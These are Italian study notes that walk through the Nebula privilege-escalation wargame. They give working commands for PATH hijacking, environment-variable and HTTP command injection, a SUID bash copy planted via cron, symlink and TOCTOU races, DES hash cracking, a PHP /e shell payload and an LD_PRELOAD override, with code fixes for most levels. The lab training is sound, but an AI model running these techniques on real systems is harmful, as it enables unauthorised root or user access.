# Nebula

## Info utili
20 challenge in totale. Si accede alle challenge con:
- user: levelN
- passwd: levelN

Gli account flagN contengono le vulnerabilità

Login amministratore:
- user: nebula
- passwd: nebula

Shell di root:
1. sudo -i
2. passwd: nebula

[Website](https://exploit.education/nebula/)

## Soluzioni challenge

### Level00

Cercare un file eseguibile che sia SUID con user flag00
```bash
find / -perm -4000 -user flag00 2> /dev/null
```

Eseguire il file ed eseguire getflag.

### Level01

L'eseguibile SUID /home/flag01/flag01 invoca echo utilizzando il comando env. Con questo comando non si invoca echo builtin ma si invoca echo esterno (quello in /bin). Si possono verificare il tipo di comandi echo disponibili mediante *type -a echo*.

Si può modificare l'ambiente per invocare con echo un binario arbitrario. Per farlo si crei un file in una qualsiasi cartella, ad esempio /tmp/echo.

```bash
touch /tmp/echo
```

Si imposti la variabile PATH in modo tale che il nuovo file sia trovato prima di quello originale.

```bash
PATH=/tmp:$PATH
```

A questo punto, si può procedere in due modi:
- si copia direttamente il binario di getflag nel binario malevolo
```bash
cp /bin/getflag /tmp/echo
```
- si crea uno script che invoca getflag tramite il file /tmp/echo
```bash
nano /tmp/echo
#inizio script
#!/bin/bash
getflag
###fine script
chmod a+x /tmp/echo
```

Eseguire /home/flag01/flag01

#### Fix: Eseguibile con privilegi inutilmente alti (fixabile solo da root)
Spegnere il bit di SUID all'eseguibile
```bash
chmod u-s /home/flag01/flag01
```

#### Fix: Eseguibile con privilegi alti per tutto il tempo e anche nella chiamata di sistema
Droppare privilegi prima della chiamata
```c
uid = getuid();

setresuid(-1, uid, -1);
system("/usr/bin/env echo and now what?");
```

#### Fix: /bin/sh non droppa i privilegi di default
Se bash viene chiamato tramite /bin/sh, non droppa di default i privilegi. Per rimuovere questo comportamento occorre rebuildare bash da source eliminando la patch *privmode.dpatch*. Si modifica poi l'eseguibile tenendo solamente la chiamata di sistema: anche se flag01 è SUID, la chiamata di sistema viene fatta dopo l'immediato drop dei privilegi.

#### Fix: Mancata sanitizzazione della variabile PATH
Non viene effettuato nessun controllo sulla variabile PATH, quindi possono essere iniettati percorsi non di sistema con binari malevoli. Si risolve questo problema impostando un filtro (whitelist) per PATH, che include solo directory di sistema: ogni modifica fatta a PATH verrebbe quindi persa.
```c
putenv(“PATH=/bin:/sbin:/usr/bin:/usr/sbin”);
```

### Level02

L'eseguibile SUID flag02 presente nella home di flag02 stampa in output il comando che esegue. Il comando arbitrario può essere iniettato modificando la variabile di ambiente $USER.

```bash
USER="string; getflag; echo"
```

Eseguire il file.

#### Fix: riflessione dell'input nell'output
Si può semplicemente eliminare il messaggio di debug (l'eseguibile rimane comunque passibile di attacco)

#### Fix: input di un valore fidato al posto di USER
Invece che prelevare il valore di USER, esposto a potenziali iniezioni di codice, si può ottenere il nome utente e mantenere lo scopo del binario utilizzando una funzione di libreria apposita, tramite la quale è impossibile effettuare iniezioni di codice.
```c
passwd = getpwuid(getuid());
if (passwd == NULL) {
    perror("getpwuid()");
    exit(EXIT_FAILURE);
}

asprintf(&buffer, "/bin/echo %s is cool", passwd->pw_name);
```

#### Fix: implementazione di una blacklist per filtrare USER
Si crea una blacklist contenente tutti i caratteri vietati nel nome utente, se almeno uno è presente in USER allora il programma termina con errore. Superata questa fase di filtro viene effettuata la validazione: se lo USER inizia con - o con _ potrebbe causare problemi e viene scartato.
```c
/* sanitizing */
if ((strpbrk(buffer, invalid_chars)) != NULL) {
    perror("strpbrk");
    exit(EXIT_FAILURE);
}
/* validating */
if (getenv("USER")[0] == '-' || getenv("USER")[0] == '_') {
    printf("Invalid username.\n");
    exit(EXIT_FAILURE);
}
```

#### Fix: implementazione di una whitelist per filtrare USER
In questo caso la fase di filtro viene effettuata da una whitelist che verifica che USER contenga solamente caratteri alfanumerici e/o - e _
```c
p = getenv("USER");
while (*p != 0) {
if (isalnum(*p) || *p == '-' || *p == '_')
    p++;
else {
    printf("Invalid username.\n");
    exit(EXIT_FAILURE);
}
}
```


### Level03

Il file /home/flag03/writable.sh viene chiamato da un crontab ogni 2 minuti. Per verificare:

```bash
su – nebula
sudo -i
su – flag03
crontab -l
```

Esegue tutti i file contenuti in writable.d per 5 secondi. Quindi è possibile eseguire un file arbitrario con i permessi di flag03. L'obiettivo è quello di spawnare una shell con i permessi di flag03.

Si crea uno script e lo si mette in writable.d. Lo script copia il binario di bash in un file e lo rende SUID, in modo che eseguendo quella bash si otterranno i permessi di flag03.

```bash
nano src.sh
### inizio script
#!/bin/bash
cp /bin/bash /home/flag03/bash
chmod u+s /home/flag03/bash
### fine script
cp src.sh /home/flag03/writable.d

```

Si attende il tempo necessario e poi si esegue
```bash
/home/flag03/bash -p #per mantenere permessi SUID che bash droppa di default
```

Si esegue ora getflag.

#### Fix: permessi di accesso alla directory troppo generosi
Occorre rivedere i permessi della cartella *writable.d* in modo che non possa essere acceduta da altri utenti al di fuori di flag03 e root. Per farlo, si restringono i permessi di accesso sia a /home/flag03, sia a /home/flag03/writable.d (anche se avendo modificato i permessi alla home è comunque impossibile accedere alla sottocartella).
```bash
chgrp flag03 /home/flag03
chmod 700 /home/flag03
#oppure se si vuole consentere l'accesso ai membri del gruppo
chmod 750 /home/flag03
chmod 700 /home/flag03/writable.d
```

### Level04
L'eseguibile nella home di flag04 attua dei controlli debolissimi per non far leggere il token:
1. impedisce che nel nome del file da leggere sia presente la sottostringa "token"
2. se non è presente procede all'apertura del file tramite funzione *open()* che controlla i privilegi effettivi

Dato che il binario è SUID occorre creare un link simbolico al file *token* e aprire quello con il binario.
```bash
ln -s /home/flag04/token /tmp/link
/home/flag04/flag04 /tmp/link
```

Autenticarsi come flag04 con il token visualizzato ed eseguire getflag.

### Level05

Nella home di flag05 è presente una cartella .backup che è accessibile a tutti gli utenti. All'interno di questa cartella è presente un archivio non direttamente estraibile per mancanza di permessi.

#### Soluzione 1
Si copia l'archivio nella home di level05 e si estrae

```bash
cp backup-19072011.tgz /home/level05
cd /home/level05
tar -xvzf backup-19072011.tgz
```

I file estratti finiscono nella cartella /home/.ssh. La chiave pubblica è inserita in autohorized_keys, quindi si presume che per accedere all'account di flag05 si possa usare la chiave privata id_rsa. Ci si connette quindi con ssh in localhost.

```bash
ssh flag05@localhost
```

Si esegue poi getflag.

### Soluzione 2 (slide)
Si copia l'archivio in locale e si estrae
```bash
#da eseguire da locale
scp -P 2222 level05@localhost:/home/flag05/.backup/*
tar xf *.tgz
```

Ci si connette all'utente remoto. Qui si specifica il tipo di chiavi accettato dal client siccome presumibilmente la versione di Linux utilizzata dal client è più moderna e non accetta più di default chiavi rsa. Si specifica anche il file della chiave privata (non necessario)

```bash
ssh -p 2222 -o PubkeyAcceptedKeyTypes=+ssh-rsa -i .ssh/id_rsa flag05@localhost
```

Si esegue poi getflag

### Level06

La password di flag06 proviene da un sistema unix legacy. Infatti analizzando /etc/passwd si nota che la password dell'utente flag06 è memorizzata cifrata, al posto della solita 'x'. (Nei sistemi moderni l'hash della passwd è visibile solo in /etc/shadow e solo da root). Si copia l'hash in un file locale e si esegue hashid per capire l'algoritmo di cifratura utilizzato.

```bash
hashid -m flag06.hash
```

Questo comando restituisce sia l'algoritmo utilizzato sia la modalità da specificare in hashcat per rompere l'hash.

```bash
hashcat -a 0 -m 1500 flag06.hash passwd.txt
```

Dove *-a 0* specifica attacco a dizionario e *-m 1500* l'algoritmo DES, trovato prima con hashid.

Si effettua ora il login a flag06 e si esegue getflag.

#### Fix: Hash della password dell'utente flag06 esposta pubblicamente in /etc/passwd
Per mitigare la debolezza è sufficiente, da root, spostare l'hash da /etc/passwd a /etc/shadow, inserendo al posto della password in /etc/passwd una x.

### Level07

Esaminando il file *thttpd.conf* contenuto nella home di flag07 si capisce che viene esposto un web server alla porta 7007, che esegue con i privilegi di flag07 e che serve la directory /home/flag07.

Esaminando lo script *index.cgi*, è possibile iniettare comandi arbitrari tramite parametro *Host* della querystring. Si esegue quindi il seguente comando per risolvere la challenge.

```bash
echo -ne "GET /index.cgi?Host=localhost%3Bgetflag\r\n\r\n" | nc localhost 7007
```

In cui:
- l'opzione -n di echo serve a disattivare \n automatico alla fine del messaggio
- l'opzione -e serve a interpretate le sequenze di escaping
- \r\n serve a terminare la linea del protocollo HTTP e a terminare il messaggio intero (per questo è ripetuto due volte).
- %3b è il corrispondente urlencoded del carattere ';', che altrimenti lo script interpreterebbe come separatore dei parametri

#### Fix: l'utente che esegue il web server ha privilegi troppo elevati
Basta sostituire l'utente in *thttpd.conf* (flag07) con l'utente meno privilegiato (level07) e riavviare il web server da root.

### Level08

Nella cartella di flag08 è presente un file .pcap leggibile da tutti. Si copia il file in locale.

```bash
scp -P 2222 level08@localhost:/home/flag08/capture.pcap .
```

Si apre il file con Wireshark e con tasto destro > follow si segue il flusso TCP. Il flusso visualizzato in ASCII mostra una password con dei punti. Cliccando su un punto si scopre che il byte corrispondente al carattere non stampabile è 0x7f, che corrisponde al carattere DEL. Si ricostruisce quindi la password finale ***backd00Rmate*** e la si usa per loggare nell'account di flag08.

Si esegue poi getflag.

### Level09
Il binario è un wrapper di uno script PHP che accetta file con righe in formato [email *altro*]. In altro è possibile specificare un comando arbitrario da eseguire mediante interpolazione delle stringhe PHP. Il comando viene eseguito grazie al modificatore /e contenuto nella regex di preg_replace.

Si crea un file di testo contenente il payload seguente:
```php
[email {${system($use_me)}}]
```

In questo modo la chiamata effettuata ad ogni match corrisponderà a spam("{${system($use_me)}}"). PHP esegue prima il comando interpolato. Il comando va specificato come secondo argomento del binario.

Si esegue quindi il binario in questo modo:
```bash
/home/flag09/flag09 payload.txt /bin/sh
```
In questo modo si ottiene una shell con i permessi di flag09 tramite la quale si può eseguire getflag.

### Level10

Nella home di flag10 si trova un file non accessibile *token* e un file SUID eseguibile da tutti che permette di inviare il contenuto di un file arbitrario ad un server in ascolto. L'obiettivo è quello di riuscire ad ottenere il contenuto di token.

Il codice sorgente dell'eseguibile presenta un pattern TOCTOU: una volta verificati i permessi corrispondenti al file da inviare, si fanno altre operazioni prima di inviare effettivamente il file. Si cerca di sfruttare questa debolezza utilizzando un link simbolico: si vuole che il controllo venga eseguito sul link simbolico che punta ad un file su cui si hanno sufficiente permessi; e poi cambiando destinazione del link si fa inviare all'eseguibile il file token.

Si crea quindi un file arbitrario e un link simbolico che punta a quel file.
```bash
touch /tmp/dummy
ln -fs /tmp/dummy /tmp/link 
```
In questo modo si ha un link simbolico che punta a /tmp/dummy, su cui si hanno i permessi.

In una shell, si crea il server per ricevere i messaggi inviati dall'eseguibile.
```bash
while true; do 
    nc.traditional -lvp 18211 >> server.txt; 
done
```
Il server viene creato in un loop altrimenti si chiuderebbe ad ogni ricezione di file

In un'altra shell, si crea lo script di switch del link simbolico tra il file token e il file dummy creato in precedenza.
```bash
while true; do 
    ln -fs /home/flag10/token /tmp/link; 
    ln -fs /tmp/dummy /tmp/link; 
done
```
Questo ciclo cambia continuamente la destinazione del link simbolico

In un'altra shell, si avvia ripetutamente l'eseguibile. Il token viene inviato quando il link punta a /tmp/dummy al momento della verifica dell'accesso e a token al momento dell'effettivo invio del file.
```bash
while true; do 
    nice -n 19 /home/flag10/flag10 /tmp/link 127.0.0.1;
done 
```
Nice viene utilizzato per ridurre la priorità del processo e aumentare le probabilità di sfruttare il TOCTOU.

A questo punto, il file *server.txt* dovrebbe contenere prima o poi il valore del token.

#### Fix: Controllo accesso con due funzioni che usano privilegi diversi
L'eseguibile effettua due controlli dell'accesso:
1. Il primo, mediante *access()* che controlla i privilegi reali
2. Il secondo, mediante *open()* che controlla i privilegi effettivi
Questo apre l'ipotesi di un attacco "scambio di link simbolico" in modo da eludere *access* per poi eseguire *open* con un altro file.

Per stroncare alla base questo tipo di attacco si può introdurre un controllo per vietare che il file passato come argomento del binario sia un symlink.
```c
if ((lstat(file, &s)) == -1) {
    printf("Unable to lstat file: %s\n", strerror(errno));
    exit(EXIT_FAILURE);
}
if (S_ISLNK(s.st_mode)) {
    printf("No symbolic links allowed.\n");
    exit(EXIT_FAILURE);
}
```
In questo modo il binario segnalerà un errore e terminerà in presenza di un symlink.

La mitigazione vista può essere aggirata mediante utilizzo di hard link, che in versioni moderne del SO non possono essere creati verso file posseduti da altri utenti, ma nella versione in Nebula invece sì. Per evitare anche questo problema, oltre al controllo sui symlink, si effettua anche un controllo sul numero di link fisici al file. Se è maggiore di uno significa che si tratta di un file che ha anche un hard link.
```c
if ((lstat(file, &s)) == -1) {
    printf("Unable to lstat file: %s\n", strerror(errno));
    exit(EXIT_FAILURE);
}
if (S_ISLNK(s.st_mode) || s.st_nlink > 1) {
    printf("No links allowed.\n");
    exit(EXIT_FAILURE);
}
```

Un altro modo per evitare che vengano aperti file contenenti un link simbolico è quello di utilizzare l'opzione *NO_FOLLOW* di *open*. In questo modo anche se venissero scambiati i link simbolici durante l'esecuzione, sarebbe comunque inutile siccome non verrebbe aperto.
```c
ffd =   open(file, O_RDONLY | O_NOFOLLOW);
        if(ffd == -1) {
            printf("Damn. Unable to open file\n");
            exit(EXIT_FAILURE);
        }
```

#### Fix: Esecuzione con privilegi inutilmente elevati
Il binario è SUID flag10 e questo permette ad un attacco "scambio di link simbolico" di essere effettivamente applicabile.

Per risolvere questo problema si possono droppare i privilegi prima della funzione *access* in modo tale che i privilegi controllati siano in entrambe le volte quelli reali e l'attacco non risulta efficace.

#### Fix: Presenza di pattern TOCTOU
I frammenti di codice che controllano e accedono al file sono distanti temporalmente. Ciò consente all’attaccante di avere una finestra temporale operativa durante la quale è possibile scambiare un link simbolico.

Per mitigare questo problema occorre eliminare il pattern TOCTOU e quindi eseguire le operazioni di controllo, apertura e lettura del file sequenzialmente. Si sottolinea che questa rappresenta solamente una mitigazione in quando un attaccante potrebbe comunque rallentare l'esecuzione del binario abbassando la priorità dello stesso tramite comando *nice*.

### Level13

Lo script nella home di flag13 controlla che si abbia l'accesso confrontando il valore tornato da getuid con FAKEID definito a 1000 (root). Per iniettera codice arbitrario in questo caso si deve eseguire una library injection. L'obiettivo è quello di sovrascrivere la funzione getuid per far tornare un valore arbitrario, in questo caso 1000.

Per farlo, si utilizza la variabile d'ambiente **LD_PRELOAD** che carica shared object prima di linkare dinamicamente altre librerie, in altre parole se qui si ridefinisce la funzione di getuid, la funzione vera presente in libc.so viene ignorata.

Si deve quindi prima creare un file C contenente la funzione malevola, con la stessa firma di quella dichiara in unistd.h
```bash
nano /tmp/exploit.c
```
```c
#include <unistd.h>
#include <sys/types.h> //metterlo perche uid_t potrebbe non essere definito in unistd.h

uid_t getuid(void){
    return 1000;
}
```

Si compila ora il sorgente, in modo tale da trasforlarmo in uno shared object, linkabile dal linker a tempo di esecuzione dell'eseguibile flag13.
```bash
gcc -shared -fPIC -o /tmp/exploit.so /tmp/exploit.c
```
In cui:
- shared serve a compilare il file come shared object
- fPIC serve a compilare il file come Position Independent Code, necessario per oggetti shared che vengono caricati in RAM in posizioni sempre diverse

Si esporta la variabile LD_PRELOAD
```bash
export LD_PRELOAD=/tmp/exploit.so
```

Infine, si copia l'eseguibile di flag13 perchè ld ignora LD_PRELOAD se è attiva la secure-execution, che viene attivata per ELF SUID. Ovvero un ELF SUID può eseguire LD_PRELOAD ma solo se si caricano librerie condivise nel percorso di ricerca standard che hanno gli stessi bit SETUID/SETGUID impostati (e solo se il file non inizia per slash '/'). Non si può rendere SUID il so senza essere root ma si può non rendere SUID l'eseguibile flag13.
```bash
cp /home/flag13/flag13 /home/level13
./flag13
```

Verrà stampato il token, con cui ci si può loggare su flag13 ed eseguire getflag.
